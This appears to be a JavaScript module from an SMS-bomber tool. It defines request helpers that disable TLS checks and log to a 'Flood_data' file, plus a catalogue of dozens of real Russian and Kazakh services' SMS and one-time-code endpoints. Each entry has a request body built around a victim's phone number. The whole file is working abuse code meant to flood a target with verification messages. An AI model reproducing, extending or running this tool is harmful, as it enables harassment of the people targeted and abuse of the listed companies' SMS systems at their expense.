const request = require('request');
const my_functions = require('../../../scripts/funcs.js')

module.exports = {
	single_req_post (service, url_data, body_data, header_data, tls, number) {
		if (tls == 'no') { 
			process.env['NODE_TLS_REJECT_UNAUTHORIZED'] = '0';
		} 

		let options = {
		url : url_data,
		method : "POST",
		headers : header_data,	
		body : body_data
		};

		function request_fun (options, service) {
			request(options, function(error, responce, body){
			if (error) {
				my_functions.append_in_file('Error_data.txt', number + ' Ошибка в сервисе: ' + service + ' ' + error)
			} else {
				try {
					if (body.length > 1000) {
						my_functions.append_in_file('Flood_data.txt', number + ' Сработал length > 1000 в сервисе ' + service + ": " + responce.statusCode + " Длина ответа: " + body.length)
					} else {
						my_functions.append_in_file('Flood_data.txt', number + ' ' + service + ": " + responce.statusCode + ' Body: ' + body)
					}
				}
				catch {
					my_functions.append_in_file('Flood_data.txt', number + ' Сработал catch в сервисе: ' + service + ' ' + responce.statusCode + ' ' + body)
				}
			}
		});
		};

		request_fun(options, service)
	},

	single_req_get (service, url_data, header_data, tls, number) {
		if (tls == 'no') { 
			process.env['NODE_TLS_REJECT_UNAUTHORIZED'] = '0';
		} 
		
		let options = {
		url : url_data,
		method : "GET",
		headers : header_data
		};

		function request_fun (options, service) {
			request(options, function(error, responce, body){
			if (error) {
				my_functions.append_in_file('Error_data.txt', number + ' Ошибка в сервисе: ' + service + ' ' + error)
			} else {
				try {
					if (body.length > 1000) {
						my_functions.append_in_file('Flood_data.txt', number + ' Сработал length > 1000 в сервисе ' + service + ": " + responce.statusCode + " Длина ответа: " + body.length)
					} else {
						my_functions.append_in_file('Flood_data.txt', number + ' ' + service + ": " + responce.statusCode + ' Body: ' + body)
					}
				}
				catch {
					my_functions.append_in_file('Flood_data.txt', number + ' Сработал catch в сервисе: ' + service + ' ' + responce.statusCode + ' ' + body)
				}
			}
		});
		};

		request_fun(options, service)
	},

	youla : {
		url : 'https://youla.ru/web-api/auth/request_code',		
		body_data : function(number) {
			const num_req = "7" + number;
			const data = {"phone" : num_req};
			const jsonData = JSON.stringify(data);
			return jsonData;
		}
	},

	yandex_eda : {
		url : 'https://eda.yandex/api/v1/user/request_authentication_code',
		body_data : function(number) {
			const num_req = "+7" + number;
			const data = {"phone_number" : num_req};
			const jsonData = JSON.stringify(data);
			return jsonData;
		}
	},

	korona : {
		url : 'https://koronapay.com/transfers/online/api/users/otps',
		body_data : function(number) {
			const num_req = "7" + number;
			const reqBody = "phone=" + num_req;
			return reqBody;
		}
	},

	ivi : {
		url : 'https://api.ivi.ru/mobileapi/user/register/phone/v6/',
		body_data : function(number) {
			const num_req = "7" + number;
			const reqBody = "phone=" + num_req;
			return reqBody;
		}
	},

	unacademy : {
		url : 'https://unacademy.com/api/v3/user/user_check/',
		body_data : function(number) {
			const data = {"phone":number,"country_code":"KZ"};
			const jsonData = JSON.stringify(data);
			return jsonData;	
		}
	},

	citilink : {
		url : function(number) {
			let url = 'https://www.citilink.ru/registration/confirm/phone/+7' + number + '/';
			return url;
		},
		body_data : function(number) {
			const data = {"phone":number,"country_code":"KZ"};
			const jsonData = JSON.stringify(data);
			return jsonData;	
		}
	},

	etm : {
		url : 'https://www.etm.ru/cat/runprog.html',
		body_data : function(number) {
			const reqBody = 'mode=sendSms&syf_prog=clients-services&getSysParam=yes&m_phone=' + number;
			return reqBody;
		}
	}, 

	qlean : {
		url : function(number) {
			let url = "https://sso.cloud.qlean.ru/http/users/requestotp?phone=7" + number + "&clientId=undefined&sessionId=1111"
			return url;
		}
	}, 

	amanat24 : {
		url : 'https://my.amanat24.kz/ru/site/reg',
		body_data : function(number) {
			const reqBody = 'PhoneValidateForm%5Bphone%5D=%2B7' + number;
			return reqBody;
		}
	}, 

	chocolife : {
		url : 'https://gateway.choco.kz/user/v2',
		body_data : function(number) {
			const reqBody = 'phone=7' + number + '&password=qweQWE!@#&timezone=Asia%2FAlmaty';
			return reqBody;
		}
	},

	del_papa : {
		url : 'https://api.del-papa.kz/v1/?r=user/signin',
		body_data : function(number) {
			const num_req = "7" + number;
			const data = {"phone" : num_req};
			const jsonData = JSON.stringify(data);
			return jsonData;	
		}
	}, 

	iconjob : {
		url : 'https://api.iconjob.co/api/auth/verification_code',
		body_data : function(number) {
			const num_req = "7" + number;
			const data = {"phone" : num_req};
			const jsonData = JSON.stringify(data);
			return jsonData;	
		}
	},

	kaspi : {
		url : 'https://kaspi.kz/util/send-app-link',
		body_data : function(number) {
			const reqBody = 'address=' + number;
			return reqBody;
		}
	}, 

	kolesa : {
		url : 'https://id.kolesa.kz/getInfoAuth.json',
		body_data : function(number) {
			const reqBody = 'project=kolesa&login=7' + number;
			return reqBody;
		}
	}, 

	supermenu : {
		url : function(number) {
			let url = 'https://api.supermenu.kz/auth/requestSmsCode?phone=7' + number;
			return url;
		},
		body_data : ' '
	},

	zenge : {
		url : function(number) {
			let url = "https://zenge.kz/auth/claim_sms_with_code?phone=+7" + number + "&procedure=reg&name=asd&city=1"
			return url;
		}
	},

	sushiwok : {
		url : 'https://almaty.sushiwok.kz/account/register/',
		body_data : function(number) {
			const reqBody = 'login=%2B7' + number;
			return reqBody;
		}
	}, 

	tanuki : {
		url : 'https://www.tanuki.kz/sendCode/',
		body_data : function(number) {
			const num_req = "(+7)" + number;
			const data = {"phone":num_req,"smsType":1,"headers":{"version":"2.0","userId":"666ebf12-9cd5-ed2f-a7c9-67f3a8d99ab1","debugMode":true,"agent":{"device":"desktop","version":"undefined undefined"},"dbgValue":"","langId":"1","cityId":"63"}}
			const jsonData = JSON.stringify(data);
			return jsonData;	
		}
	},

	thefroot : {
		url : 'https://v2api.thefroot.com/v1/market/send-sms/',
		body_data : function(number) {
			const num_req = "7" + number;
			const data = {"phone" : num_req};
			const jsonData = JSON.stringify(data);
			return jsonData;	
		}
	},

	mail_kz : {
		url : 'https://mail.kz/ru/registration',
		body_data : function(number) {
			const number_1 = "%2B7+(" + number.substring(0, 3) + ")+" + number.substring(3, 6) + "-" + number.substring(6, 8) + "-" +  number.substring(8, 10);
			const reqBody = "action=get-code&email=aqweasd&domain=%40mail.kz&phone=" + number_1 + "&password=qwe123QWE!&password_confirmation=qwe123QWE!&agree=1w";
			return reqBody;
		}
	},

	sulpak : {
		url : 'https://www.sulpak.kz/Customers/Register',
		body_data : function(number) {
			const reqBody = "Name=Amangeldi&RegistrationPhoneNumber=%2B7" + number + "&Email=asdsa%40ya.ru&RegistrationPassword=qweQWE123!&RepeatPassword=qweQWE123!";
			return reqBody;
		}
	},

	mi_com : {
		url : 'https://mi.com.kz/',
		body_data : function(number) {
			const reqBody = 'component=bxmaker.authuserphone.login&method=sendCode&phone=%2B7' + number + '&registration=N';
			return reqBody;
		}
	},

	evrika : {
		url : 'https://evrika.com/ajax/send-code/',
		body_data : function(number) {
			const reqBody = 'phone=%2B7' + number;
			return reqBody;
		}
	},

	sushiwok_recover : {
		url : 'https://almaty.sushiwok.kz/account/recover/',
		body_data : function(number) {
			const reqBody = 'login=%2B7' + number;
			return reqBody;
		}
	},

	rutube_list : {
		url : 'https://pass.rutube.ru/api/accounts/phone/send-code/',
		body_data : function(number) {
			const num_req = "+7" + number;
			const data = {"phone" : num_req};
			const jsonData = JSON.stringify(data);
			return jsonData;	
		}
	},

	leman : {
		url : 'https://leman.bet/WebServices/BRService.asmx/RegisterFast',
		body_data : function(number) {
			const num_req = "+7" + number;
			const data = {"regData":{"UserName": num_req,"Password":"zxcasdqwe"}};
			const jsonData = JSON.stringify(data);
			return jsonData;	
		}
	},

	anytime : {
		url : 'https://anytime.kz/send_sms.php',
		body_data : function(number) {
			const reqBody = 'phone=7' + number;
			return reqBody;
		}
	},

	kaztube : {
		url : 'https://kaztube.kz/api.php/v1/user/registration/1/',
		body_data : function(number) {
			const num_req = "+7 " + number.substring(0, 3) + " " + number.substring(3, 6) + " " + number.substring(6, 8) + " " +  number.substring(8, 10);
			const data = {"phone": num_req} 
			const jsonData = JSON.stringify(data);
			return jsonData;	
		}
	},

	tinkoff : {
		url : 'https://api.tinkoff.ru/v1/sign_up?origin=web%2Cib5%2Cplatform',
		body_data : function(number) {
			const reqBody = 'phone=+7' + number;
			return reqBody;
		}
	},

	tiktok : {
		url : 'https://m.tiktok.com/node/send/download_link',
		body_data : function(number) {
			const num_req = number.substring(1);
			const data = {"slideVerify":0,"language":"en","PhoneRegionCode":"77","Mobile": num_req,"page":{"af_adset_id":0,"pid":0}};
			const jsonData = JSON.stringify(data);
			return jsonData;	
		}
	},

	sberfood : {
		url : 'https://app.sberfood.ru/api/mobile/v3/auth/sendSms',
		body_data : function(number) {
			const num_req = "+7" + number;
			const data = {"userPhone":num_req};
			const jsonData = JSON.stringify(data);
			return jsonData;	
		}
	},

	ozon : {
		url : 'https://www.ozon.ru/webapi/composer-api.bx/_action/fastEntryV3',
		body_data : function(number) {
			const num_req = "7" + number;
			const data = {"hideHints":false,"phone":num_req}
			const jsonData = JSON.stringify(data);
			return jsonData;	
		}
	},

	cloud_mail : {
		url : 'https://cloud.mail.ru/api/v2/notify/applink',
		body_data : function(number) {
			const num_req = "+7" + number;
			const data = {"phone":num_req,"api":2,"email":"xxx@mail.ru","x-email":"zzz@mail.ru"};
			const jsonData = JSON.stringify(data);
			return jsonData;	
		}
	},

	lenta : {
		url : 'https://lenta.com/api/v1/authentication/requestValidationCode',
		body_data : function(number) {
			const num_req = "+7" + number;
			const data = {"phone": num_req};
			const jsonData = JSON.stringify(data);
			return jsonData;	
		}
	},

	raiffeisen : {
		url : function(number) {
			let url = 'https://oapi.raiffeisen.ru/api/sms-auth/public/v1.0/phone/code?number=7' + number;
			return url;
		}
	},

	icq : {
		url : 'https://u.icq.net/api/v4/rapi',
		body_data : function(number) {
			const num_req = "7" + number;
			const data = {"method":"auth/sendCode","reqId":"24973-1587490090","params":{"phone": num_req,"language":"en-US","route":"sms","devId":"ic1rtwz1s1Hj1O0r","application":"icq"}};
			const jsonData = JSON.stringify(data);
			return jsonData;	
		}
	},

	makarolls : {
		url : 'https://makarolls.ru/local/templates/makarolls/components/aloe/aloe.user/.default/login.php',
		body_data : function(number) {
			const reqBody = 'data=7' + number + '&metod=postreg';
			return reqBody;
		}
	},

	mousam : {
		url : 'https://mousam.ru/newapi/checkphone.json',
		body_data : function(number) {
			const reqBody = 'phone=7' + number;
			return reqBody;
		}
	},

	friendsclub : {
		url : 'https://friendsclub.ru/assets/components/pl/connector.php',
		body_data : function(number) {
			const reqBody = 'casePar=advancedRequestSMSLogin&Phone=%2B' + number;
			return reqBody;
		}
	},

	eurasia36 : {
		url : 'https://eurasia36.kz/Eurasia.API/api/Main/RequestCode',
		body_data : function(number) {
			const num_req = "7" + number;
			const data = {"RequestType": "sms", "Contact": num_req, "Localization": "ru"};
			const jsonData = JSON.stringify(data);
			return jsonData;	
		}
	},

	nomad : {
		url : function(number) {
			let url = 'https://epolicy.nomad.kz/epolicy/rest/registerNewAccountPhone?phone=7' + number + '&isCompany=false';
			return url;
		}
	},

	asko24 : {
		url : function(number) {
			let url = 'https://asko24.kz/policy/phone?phone=%2B7' + number;
			return url;
		}
	},

	bcc : {
		url : 'https://wifi.bcc.kz/hotspot/sendOtp',
		body_data : function(number) {
			const num_req = "+7" + number;
			const data = {"iin":"777777777777","phone": num_req};
			const jsonData = JSON.stringify(data);
			return jsonData;	
		}
	},

	altbalaji : {
		url : 'https://api.cloud.altbalaji.com/accounts/mobile/verify?domain=ROW',
		body_data : function(number) {
			const num_req = number.substring(1);
			const data = {"phone_number":num_req,"country_code":"77","platform":"web"}
			const jsonData = JSON.stringify(data);
			return jsonData;	
		}
	}

}
